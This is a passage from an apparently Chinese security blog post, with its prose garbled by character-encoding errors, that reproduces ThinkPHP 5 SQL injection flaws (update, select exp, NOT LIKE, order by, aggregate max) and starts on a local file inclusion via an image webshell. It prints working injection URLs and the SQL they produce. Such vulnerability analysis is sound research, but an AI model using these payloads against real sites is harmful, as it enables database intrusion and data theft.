success&#39;;    }}</code></pre><p>å¤§è‡´æ€è·¯è·Ÿä¸Šé¢ä¸€æ ·ã€‚åªä¸è¿‡æ­¤å¤„æ˜¯updateæ³¨å…¥ã€‚æˆ‘ä»¬åŒæ ·å¯ä»¥è·Ÿåˆ°Query.phpã€‚å‘ç°å…¶å®è°ƒç”¨çš„æ˜¯Connectionç±»çš„updateæ–¹æ³•ã€‚ä»£ç å¦‚ä¸‹</p><pre><code class="php">$sql  = $this-&gt;builder-&gt;update($query);</code></pre><p>builderä¾æ—§æ˜¯ä¸Šé¢æè¿‡çš„Builderç±»å¯¹è±¡ã€‚å…¶updateæ–¹æ³•ä¾æ—§æ˜¯å…ˆè°ƒç”¨parseDataå†è¿›è¡Œsqlè¯­å¥çš„è¿”å›ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹ä¿®å¤åçš„parseDataçš„caseè¯­å¥<br><img src="/2020/08/05/Thinkphp-vuln/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>defaultä»£ç æ®µparseArrayData</p><p><img src="/2020/08/05/Thinkphp-vuln/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>(è¿™é‡Œæˆ‘composerè£…ä¸äº†tp5.1.7,å¦‚æœæ˜¯ä¹‹å‰çš„ç‰ˆæœ¬parseArrayDataåº”è¯¥æ˜¯ç›´æ¥è¿”å›falseçš„)</p><p>å¯ä»¥çœ‹åˆ°æœ€åå…¶å®resultæ˜¯è¿™æ ·å½¢å¼çš„å­—ç¬¦ä¸²<code>$fun(&#39;$point($value)&#39;)</code>ã€‚é‚£ä¸æˆ‘ä»¬ä¹‹å‰çš„åŸºæœ¬æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«,è¿˜æ˜¯æœ‰æ‹¼æ¥ã€‚ç›´æ¥æ„é€ æˆ<code>updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</code>å³å¯.æ‰€ä»¥æˆ‘ä»¬å‰é¢åªè¦è¿›å…¥defaultåˆ†æ”¯å°±èƒ½è¾¾æˆè¿™é‡Œçš„sqlè¯­å¥æ„é€ äº†ã€‚</p><p>æœ€åæ”»å‡»payload</p><pre><code>?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0 </code></pre><h2 id="tp5-sqli-select"><a href="#tp5-sqli-select" class="headerlink" title="tp5-sqli-select"></a>tp5-sqli-select</h2><p>é…ç½®Index.php</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index{    public function index()    {        $username = request()-&gt;get(&#39;username&#39;);        $result = db(&#39;users&#39;)-&gt;where(&#39;username&#39;,&#39;exp&#39;,$username)-&gt;select();        return &#39;select success&#39;;    }}</code></pre><p>payload</p><pre><code>?username=)%20union%20select%20updatexml(1,concat(0x7e,user(),0x7e),1)%23</code></pre><p>ä»æˆåŠŸæ‰§è¡Œæ³¨å…¥çš„debugç•Œé¢å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ‰§è¡Œçš„sqlè¯­å¥</p><pre><code class="sql">SELECT * FROM `users` WHERE ( `username` ) union select updatexml(1,concat(0x7e,user(),0x7e),1)# )</code></pre><p>è¿™æ˜¯ä¸€ä¸ªtp5å…¨ç‰ˆæœ¬çš„æ³¨å…¥ã€‚ä¸è¿‡ä¼¼ä¹å®˜æ–¹ä¸è®¤è¿™ä¸ªæ´ã€‚<br>æ¥ä¸‹æ¥ç›´æ¥è·Ÿä¸‹æºç .<br>é¦–å…ˆæˆ‘ä»¬ä¸Šé¢çš„<code>$username = request()-&gt;get(&#39;username&#39;);</code>ä¼šç»è¿‡Requestç±»è°ƒç”¨inputæ–¹æ³•å¤„ç†è¾“å…¥.ä½†æ˜¯è¿™ä¸ªinputæ–¹æ³•å¹¶æ²¡æœ‰èµ·åˆ°è¿‡æ»¤çš„ä½œç”¨ã€‚åƒæˆ‘ä»¬payloadä¸­ä¸å«<code>/</code>å’Œ<code>.</code>çš„è¯å°±æ˜¯ç›´æ¥åŸæ•°æ®è¿”å›ã€‚</p><p>ç„¶åæˆ‘ä»¬çœ‹åˆ°æ¥ä¸‹æ¥è°ƒç”¨çš„Queryç±»çš„whereæ–¹æ³•</p><pre><code class="php">public function where($field, $op = null, $condition = null){    $param = func_get_args();    array_shift($param);    $this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);    return $this;}</code></pre><p><code>parseWhereExp</code>è¿™é‡Œä¸ç”¨æ·±å…¥,ä¸»è¦æ˜¯åˆ†ææŸ¥è¯¢æ¨¡å¼ã€‚ç›´æ¥çœ‹è¿”å›å€¼çš„è¯ä¼šå‘ç°è®¾ç½®äº†ç±»ä¸­çš„<code>$options[&#39;where&#39;]</code>ã€‚æˆ‘ä»¬ä¸»è¦çœ‹åé¢<code>select()</code></p><p>æ¥ä¸‹æ¥ä¾æ—§æ˜¯tp5æ‰§è¡Œsqlè¯­å¥çš„è€å¥—è·¯ã€‚å®é™…è°ƒç”¨çš„æ˜¯Builderç±»çš„select æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•è°ƒç”¨äº†å·¨é‡çš„str_replace()ç”¨äºå¡«å……è¯­å¥ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>whereè¯­å¥æ˜¯å­˜åœ¨ç”¨æˆ·å¯æ§å˜é‡çš„ã€‚æ‰€ä»¥è·Ÿè¿›<code>parseWhere</code>.ç„¶åå‘ç°è°ƒç”¨<code>buildWhere</code></p><p>buildwhereä»£ç é‡ç›¸å¯¹æ›´å¤šã€‚ä½†æ˜¯åŒæ ·å­˜åœ¨ä¸€ä¸ªforå¾ªç¯<code>foreach ($where as $key =&gt; $val)</code>.è¿™é‡Œæˆ‘ä»¬è¿›å…¥æœ€åä¸€ä¸ªelseã€‚å¹¶ä¸”è°ƒç”¨<code>parseWhereItem</code>ã€‚<br>è€ŒparseWhereItemä¸­æœ‰è¿™æ ·çš„elseif</p><pre><code class="php">elseif (&#39;EXP&#39; == $exp) {// è¡¨è¾¾å¼æŸ¥è¯¢    $whereStr .= &#39;( &#39; . $key . &#39; &#39; . $value . &#39; )&#39;;</code></pre><p>æ­¤å¤„keyä¸ºusernameã€‚valueä¸ºå¯æ§å˜é‡ã€‚å³å¯æ‹¼æ¥è¾¾æˆæ³¨å…¥ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="tp5-0-sqli-select-5-0-10"><a href="#tp5-0-sqli-select-5-0-10" class="headerlink" title="tp5.0-sqli-select-5.0.10"></a>tp5.0-sqli-select-5.0.10</h2><p>5.0.10ç‰ˆæœ¬çš„sqlæ³¨å…¥ã€‚é…ç½®Index.phpå¦‚ä¸‹</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index{    public function index()    {        $username = request()-&gt;get(&#39;username/a&#39;);        $result = db(&#39;users&#39;)-&gt;where([&#39;username&#39; =&gt; $username])-&gt;select();        var_dump($result);    }}</code></pre><p>å¤ç°payload</p><pre><code>?username[0]=not like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=) union select 1,user()#</code></pre><p><img src="/2020/08/05/Thinkphp-vuln/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å‰é¢æåˆ°äº†æˆ‘ä»¬çš„è¾“å…¥ä¼šç»è¿‡Requestçš„get()æ–¹æ³•ã€‚å®ƒä¼šä¸€è·¯è°ƒç”¨input()ï¼ŒgetFilter(),filterValue(),filterExp()æ¥å¤„ç†æˆ‘ä»¬çš„è¾“å…¥ã€‚</p><pre><code class="php">public function filterExp(&amp;$value){    // è¿‡æ»¤æŸ¥è¯¢ç‰¹æ®Šå­—ç¬¦    if (is_string($value) &amp;&amp; preg_match(&#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#39;, $value)) {        $value .= &#39; &#39;;    }    // TODO å…¶ä»–å®‰å…¨è¿‡æ»¤}</code></pre><p>å¯ä»¥çœ‹åˆ°åƒä¹‹å‰çš„expä¼šè¢«å˜æˆ<code>exp</code>çš„å¤„ç†ã€‚ä½†æ˜¯5.0.10ç‰ˆæœ¬çš„è¿‡æ»¤æ˜¯æœ‰é—®é¢˜çš„ã€‚é—®é¢˜å‡ºåœ¨<code>NOTLIKE</code>ä¸Šã€‚å…¶æ›´æ–°ç‰ˆæœ¬çš„å¤„ç†æ˜¯åŠ å…¥äº†<code>NOT LIKE</code>.</p><p>æ¥ä¸‹æ¥è·Ÿä¸Šé¢é‚£ä¸ªå…¨ç‰ˆæœ¬çš„sqlæ³¨å…¥å¯ä»¥æŒ‰ä¸€æ ·çš„æµç¨‹èµ°åˆ°parseWhereItemé‚£ã€‚<br>æˆ‘ä»¬çš„exp<code>not like</code>å­˜åœ¨äºthis-&gt;expè¿™ä¸ªæ•°ç»„.æ‰€ä»¥ä¼šè¿›å…¥åº•ä¸‹<code>elseif (&#39;LIKE&#39; == $exp || &#39;NOT LIKE&#39; == $exp)</code>çš„åˆ†æ”¯</p><pre><code class="php">elseif (&#39;LIKE&#39; == $exp || &#39;NOT LIKE&#39; == $exp) {// æ¨¡ç³ŠåŒ¹é…if (is_array($value)) {    foreach ($value as $item) {        $array[] = $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseValue($item, $field);    }    $logic = isset($val[2]) ? $val[2] : &#39;AND&#39;;    $whereStr .= &#39;(&#39; . implode($array, &#39; &#39; . strtoupper($logic) . &#39; &#39;) . &#39;)&#39;;} else {    $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseValue($value, $field);}</code></pre><p>å¯ä»¥çœ‹åˆ°<code>$whereStr .= &#39;(&#39; . implode($array, &#39; &#39; . strtoupper($logic) . &#39; &#39;) . &#39;)&#39;;</code>è¿™æ‹¼æ¥äº†logicå˜é‡ã€‚è€Œloginä¼šåœ¨ä¼ å…¥äº†<code>val[2]</code>çš„æ—¶å€™å–è‡ª<code>val[2]</code>ã€‚è¿™æ˜¯ä¸€ä¸ªç”¨æˆ·å¯æ§å˜é‡ã€‚æ‰€ä»¥å¯ä»¥è¾¾æˆsqlæ³¨å…¥ã€‚å‰©ä¸‹çš„æˆ‘ä»¬ç›´æ¥åœ¨å‰é¢æ„é€ ä¸€ä¸ªåˆç†çš„not likeçš„è¯­å¥å°±èƒ½åœ¨åé¢è¿›è¡Œunion select ä»è€Œæ‹¼å‡ºä¸€ä¸ªå®Œæ•´çš„sqlè¯­å¥ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä»Šå¤©å…ˆæ›´è¿™ä¹ˆå¤šå§ã€‚çœ‹äº†phpè¿™ä¹ˆä¹…æœç„¶è¿˜æ˜¯nodejsæ›´é¦™â€¦â€¦</p><h2 id="tp5-sqli-orderby"><a href="#tp5-sqli-orderby" class="headerlink" title="tp5-sqli-orderby"></a>tp5-sqli-orderby</h2><p>Index.phpé…ç½®å¦‚ä¸‹</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index{    public function index()    {        $orderby = request()-&gt;get(&#39;orderby&#39;);        $result = db(&#39;users&#39;)-&gt;where([&#39;username&#39; =&gt; &#39;byc_404&#39;])-&gt;order($orderby)-&gt;find();        var_dump($result);    }}</code></pre><p>(æ•°æ®åº“ä¸­usersè¡¨å·²æœ‰byc_404ç”¨æˆ·)<br>è¿™é‡Œä½¿ç”¨tp5.1.22ç‰ˆæœ¬ã€‚æ³¨å…¥payload</p><pre><code>?orderby[id`|updatexml(1,concat(0x7e,user(),0x7e),1)%23]=1</code></pre><p>ä»æˆåŠŸè§¦å‘æ³¨å…¥çš„ä½ç½®æˆ‘ä»¬å¯ä»¥çœ‹åˆ°sqlè¯­å¥å¦‚ä¸‹</p><pre><code class="sql">SELECT * FROM `users` WHERE `username` = &#39;byc_404&#39; ORDER BY `id`|updatexml(1,concat(0x7e,user(),0x7e),1)#` LIMIT 1</code></pre><p>è·Ÿä¸‹æµç¨‹ã€‚é¦–å…ˆ5.1.22å¯¹è¾“å…¥åšçš„è¿‡æ»¤è·Ÿä»¥å¾€ç‰ˆæœ¬ä¸å¤ªä¸€æ ·äº†ã€‚æˆ‘ä»¬å…ˆçœ‹çœ‹getæ–¹æ³•çš„å¤„ç†</p><pre><code class="php">public function get($name = &#39;&#39;, $default = null, $filter = &#39;&#39;){    if (empty($this-&gt;get)) {        $this-&gt;get = $_GET;    }    return $this-&gt;input($this-&gt;get, $name, $default, $filter);}</code></pre><p>input()</p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;){    if (false === $name) {        // è·å–åŸå§‹æ•°æ®        return $data;    }    $name = (string) $name;    if (&#39;&#39; != $name) {        // è§£æname        if (strpos($name, &#39;/&#39;)) {            list($name, $type) = explode(&#39;/&#39;, $name);        }        $data = $this-&gt;getData($data, $name);        if (is_null($data)) {            return $default;        }        if (is_object($data)) {            return $data;        }    }    // è§£æè¿‡æ»¤å™¨    $filter = $this-&gt;getFilter($filter, $default);    if (is_array($data)) {        array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);        reset($data);    } else {        $this-&gt;filterValue($data, $name, $filter);    }    if (isset($type) &amp;&amp; $data !== $default) {        // å¼ºåˆ¶ç±»å‹è½¬æ¢        $this-&gt;typeCast($data, $type);    }    return $data;}</code></pre><p>å¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬çš„<code>$data</code>æ˜¯æ•°ç»„çš„è¯ã€‚èµ°çš„æ˜¯<code>array_walk_recursive</code>ã€‚è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯</p><pre><code>array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] ) : boolå°†ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•° callback åº”ç”¨åˆ° array æ•°ç»„ä¸­çš„æ¯ä¸ªå•å…ƒ</code></pre><p>æ¯”å¦‚æˆ‘å†™è¿™æ ·ä¸€ä¸ªdemo</p><pre><code class="php">&lt;?php$a=array(&quot;a&quot;=&gt;&quot;testtest1232333&quot;,&quot;b##&quot;=&gt;&quot;tes#tt##est&quot;);function sanitize($str){    $str=str_replace(&quot;#&quot;,&quot;&quot;,$str);    echo($str.&quot;\n&quot;);}$end=array_walk_recursive($a,&#39;sanitize&#39;);</code></pre><p>è‡ªå®šä¹‰ä¸€ä¸ªå›è°ƒå‡½æ•°å°†å­—ç¬¦ä¸­é—´çš„<code>#</code>æ›¿æ¢ä¸ºç©ºã€‚å…¶è¾“å‡ºä¸º<br><img src="/2020/08/05/Thinkphp-vuln/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¯ä»¥çœ‹åˆ°å®é™…ä¸Šåªéå†äº†æ•°ç»„çš„å€¼ã€‚æ²¡æœ‰å¤„ç†æ•°ç»„çš„é”®ã€‚æ‰€ä»¥è¿™é‡Œçš„filtervalueå¯¹æ•°ç»„çš„é”®æ²¡æœ‰ä»»ä½•å½±å“ã€‚</p><p>ä¹‹åæ‰§è¡Œè¯­å¥æ“ä½œæ—¶ã€‚æˆ‘ä»¬çš„whereä»ç„¶è·Ÿå‰é¢ä¸€æ ·ã€‚å°†å€¼å­˜å‚¨åœ¨<code>$options</code>æ•°ç»„ä¸­ã€‚è€Œæ¥å—æˆ‘ä»¬ç”¨æˆ·è¾“å…¥<code>order</code>æ–¹æ³•ä¹Ÿæ˜¯ä¸€æ ·ã€æœ€ç»ˆå€¼è¢«å®Œæ•´å­˜è¿›<code>$this-&gt;options[&#39;order&#39;]</code>ä¸­</p><p>ç„¶åè‡ªç„¶åˆæ˜¯<code>find</code>äº†ã€‚å®ƒè°ƒç”¨<code>Builder</code>ç±»çš„<code>select</code>è‚¯å®šå·²ç»éå¸¸ç†Ÿæ‚‰äº†ã€‚ä¸è¿‡è¿™æ¬¡æˆ‘ä»¬orderbyè¿›å…¥çš„æ˜¯è¿™ä¸ªåˆ†æ”¯<code>$this-&gt;parseOrder($query, $options[&#39;order&#39;])</code></p><pre><code class="php">protected function parseOrder(Query $query, $order){    if (empty($order)) {        return &#39;&#39;;    }    $array = [];    foreach ($order as $key =&gt; $val) {        if ($val instanceof Expression) {            $array[] = $val-&gt;getValue();        } elseif (is_array($val)) {            $array[] = $this-&gt;parseOrderField($query, $key, $val);        } elseif (&#39;[rand]&#39; == $val) {            $array[] = $this-&gt;parseRand($query);        } else {            if (is_numeric($key)) {                list($key, $sort) = explode(&#39; &#39;, strpos($val, &#39; &#39;) ? $val : $val . &#39; &#39;);            } else {                $sort = $val;            }            $sort    = strtoupper($sort);            $sort    = in_array($sort, [&#39;ASC&#39;, &#39;DESC&#39;], true) ? &#39; &#39; . $sort : &#39;&#39;;            $array[] = $this-&gt;parseKey($query, $key, true) . $sort;        }    }    return &#39; ORDER BY &#39; . implode(&#39;,&#39;, $array);}</code></pre><p>è¿™é‡ŒåŒæ ·æ²¡æœ‰è¿‡æ»¤ã€‚å¤„ç†çš„å‡½æ•°åªæœ‰ä¸€ä¸ªparseKeyã€‚æ³¨æ„è¿™é‡Œçš„parseKeyæ˜¯db/builder/Mysql.phpä¸­çš„parseKeyã€‚</p><p><img src="/2020/08/05/Thinkphp-vuln/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å®ƒå¯¹keyçš„å¤„ç†åªæ˜¯åŠ äº†åå¼•å·ç¯ç»•ã€‚å› æ­¤å…¶å®æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ã€‚æˆ‘ä»¬æ³¨å…¥payloadåªéœ€ç”¨æ³¨é‡Šç¬¦å³å¯è§£å†³æ‰ã€‚</p><p>æœ€åå®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯ï¼šåœ¨æ‹¼æ¥å­—ç¬¦ä¸²å‰å¯¹å˜é‡è¿›è¡Œæ£€æŸ¥ï¼Œçœ‹æ˜¯å¦å­˜åœ¨ <code>)</code>ã€<code>#</code> ä¸¤ä¸ªç¬¦å·</p><h2 id="tp5-sqli-Aggregatefunciton"><a href="#tp5-sqli-Aggregatefunciton" class="headerlink" title="tp5-sqli-Aggregatefunciton"></a>tp5-sqli-Aggregatefunciton</h2><p>tp5sqlæ³¨å…¥æœ€åä¸€ä¸ªæ˜¯mysqlèšåˆå‡½æ•°å¯¼è‡´çš„æ¼æ´ã€‚ ç‰ˆæœ¬æ˜¯5.0.0&lt;=ThinkPHP&lt;=5.0.21 ã€ 5.1.3&lt;=ThinkPHP5&lt;=5.1.25<br>ä¸åŒç‰ˆæœ¬åˆ©ç”¨payloadéœ€è¦å¾®è°ƒã€‚</p><p>ä¾‹å¦‚5.1.22ç‰ˆæœ¬payload</p><pre><code>?options=id`)+updatexml(1,concat(0x7e,user(),0x7e),1) from users#</code></pre><p><img src="/2020/08/05/Thinkphp-vuln/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æˆ‘ä»¬è¿˜æ˜¯è·Ÿè¿›æºç ã€‚ä»å‰é¢å‡ æ¬¡çš„ç»éªŒæˆ‘ä»¬å·²ç»å¯ä»¥æ€»ç»“å‡º,tp5å­˜åœ¨æ¼æ´çš„å‡ ä¸ªç‰ˆæœ¬å¯¹è¾“å…¥çš„è¿‡æ»¤åŸºæœ¬æ²¡æœ‰æˆ–è€…å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚æ­¤å¤„æˆ‘ä»¬çš„è¾“å…¥åŒæ ·æ²¡æœ‰å—åˆ°è¿‡æ»¤å½±å“ã€‚å› æ­¤ç›´æ¥ä»<code>$result = db(&#39;users&#39;)-&gt;max($options);</code>è¿™é‡Œè·Ÿè¿›maxå‡½æ•°ã€‚å‘ç°è¿›è€Œè°ƒç”¨äº†<code>aggregate</code></p><pre><code class="php">public function aggregate($aggregate, $field, $force = false){    $this-&gt;parseOptions();    $result = $this-&gt;connection-&gt;aggregate($this, $aggregate, $field);    if (!empty($this-&gt;options[&#39;fetch_sql&#39;])) {        return $result;    } elseif ($force) {        $result = (float) $result;    }    return $result;}</code></pre><p>ç»§ç»­çœ‹åˆ°Connectionç±»çš„aggregate</p><pre><code class="php">public function aggregate(Query $query, $aggregate, $field){    $field = $aggregate . &#39;(&#39; . $this-&gt;builder-&gt;parseKey($query, $field, true) . &#39;) AS tp_&#39; . strtolower($aggregate);    return $this-&gt;value($query, $field, 0);}</code></pre><p>parsekeyå‡½æ•°ä¸Šé¢ä¸€ä¸ªæ³¨å…¥çš„ä¾‹å­æåˆ°äº†ã€‚æ˜¯å¯¹æˆ‘ä»¬çš„è¾“å…¥åœ¨ä¸¤ä¾§åŠ åå¼•å·çš„ä½œç”¨ã€‚é‚£ä¹ˆè‡ªç„¶æˆ‘ä»¬æ³¨å…¥payloadå¯ä»¥é—­åˆåŠ æ³¨é‡Šç¬¦è§£å†³æ‰ã€‚ä¸‹é¢ç›´æ¥çœ‹value.valueåŒæ ·ä¼šè°ƒç”¨æˆ‘ä»¬éå¸¸ç†Ÿæ‚‰çš„builderçš„selectæ–¹æ³•ã€‚åªä¸è¿‡è¿™æ¬¡è°ƒç”¨çš„æ˜¯<code>parseField</code> ã€‚æœ€åè¿˜æ˜¯æ²¡æœ‰åšä»»ä½•è¿‡æ»¤å¤„ç†ã€‚è¿”å›è¯­å¥ã€‚</p><p>å®Œæ•´è¯­å¥å¦‚ä¸‹</p><pre><code class="sql">SELECT MAX(`id`)+updatexml(1,concat(0x7e,user(),0x7e),1) from users#`) AS tp_max FROM `users` LIMIT 1</code></pre><p>è‡³æ­¤tp5çš„sqlæ³¨å…¥ç³»åˆ—å°±ç»“æŸäº†ã€‚æ˜å¤©å¼€å§‹å…ˆçœ‹rce,ä¹‹åæ˜¯ååºåˆ—åŒ–popé“¾ã€‚</p><h2 id="tp5-lfi"><a href="#tp5-lfi" class="headerlink" title="tp5-lfi"></a>tp5-lfi</h2><p>Index.phpé…ç½®å¦‚ä¸‹</p><pre><code class="php">&lt;?phpnamespace app\index\controller;use think\Controller;class Index extends Controller{    public function index()    {        $this-&gt;assign(request()-&gt;get());        return $this-&gt;fetch(); // å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html    }}</code></pre><p>å½±å“ç‰ˆæœ¬:5.0.0&lt;=ThinkPHP5&lt;=5.0.18 ã€5.1.0&lt;=ThinkPHP&lt;=5.1.10</p><p>ä½¿ç”¨<code>?cacheFile=1.jpg</code>(jpgä¸ºå¯¹åº”å›¾ç‰‡é©¬)è§¦å‘lfi.</p><p>é¦–å…ˆè¾“å…¥ç”±<code>assign()</code>å‡½æ•°å¤„ç†ã€‚æˆ‘ä»¬ä¸€è·¯è·Ÿåˆ°Viewç±»çš„<code>assign()</code>å‡½æ•°ã€‚</p><pre><code class="php">public function assign($name, $value = &#39;&#39;){    if (is_array($name)) {        $this-&gt;data = array_merge($this-&gt;data, $name);    } else {        $this-&gt;data[$name] = $value;    }    return $this;}</code></pre><p>çœ‹åˆ°æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ç›´æ¥ä¿å­˜åˆ°viewçš„<code>$this-&gt;data</code><br>æ¥ä¸‹æ¥è°ƒç”¨<code>fetch</code>.æˆ‘ä»¬åŒæ ·ä¸€è·¯è·Ÿåˆ°Viewç±»çš„<code>fetch</code>ä¸­ã€‚</p><pre><code class="php">public function fetch($template = &#39;&#39;, $vars = [], $replace = [], $config = [], $renderContent = false){    // æ¨¡æ¿å˜é‡    $vars = array_merge(self::$var, $this-&gt;data, $vars);    // é¡µé¢ç¼“å­˜    ob_start();    ob_implicit_flush(0);    // æ¸²æŸ“è¾“å‡º    try {        $method = $renderContent ? &#39;display&#39; : &#39;fetch&#39;;        // å…è®¸ç”¨æˆ·è‡ªå®šä¹‰æ¨¡æ¿çš„å­—ç¬¦ä¸²æ›¿æ¢        $replace = array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;));        $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;, $replace);        $this-&gt;engine-&gt;$method($template, $vars, $config);    } catch (\Exception $e) {        ob_end_clean();        throw $e;    }    // è·å–å¹¶æ¸…ç©ºç¼“å­˜    $content = ob_get_clean();    // å†…å®¹è¿‡æ»¤æ ‡ç­¾    Hook::listen(&#39;view_filter&#39;, $content);    return $content;}</code></pre><p>è¿™é‡Œå¾ˆå¿«ä¼šå‘ç°å®é™…è°ƒç”¨çš„æ˜¯<code>$this-&gt;engine-&gt;$method($template, $vars, $config);</code>.è€Œ<code>$method</code>æ­¤å¤„ä¸º<code>fetch</code>,<code>$vars</code>ä¸ºæˆ‘ä»¬å¯æ§çš„ä¼ å…¥å˜é‡ã€‚æ¥ä¸‹æ¥ç”±æ¨¡æ¿å¼•æ“å¤„ç†æˆ‘ä»¬çš„å˜é‡</p><pre><code class="php">public function fetch($template, $data = [], $config = []){    if (&#39;&#39; == pathinfo($template, PATHINFO_EXTENSION)) {        // è·å–æ¨¡æ¿æ–‡ä»¶å        $template = $this-&gt;parseTemplate($template);    }    // æ¨¡æ¿ä¸å­˜åœ¨ æŠ›å‡ºå¼‚å¸¸    if (!is_file($template)) {        throw new TemplateNotFoundException(&#39;template not exists:&#39; . $template, $template);    }    // è®°å½•è§†å›¾ä¿¡æ¯    App::$debug &amp;&amp; Log::record(&#39;[ VIEW ] &#39; . $template . &#39; [ &#39; . var_export(array_keys($data), true) . &#39; ]&#39;, &#39;info&#39;);    $this-&gt;template-&gt;fetch($template, $data, 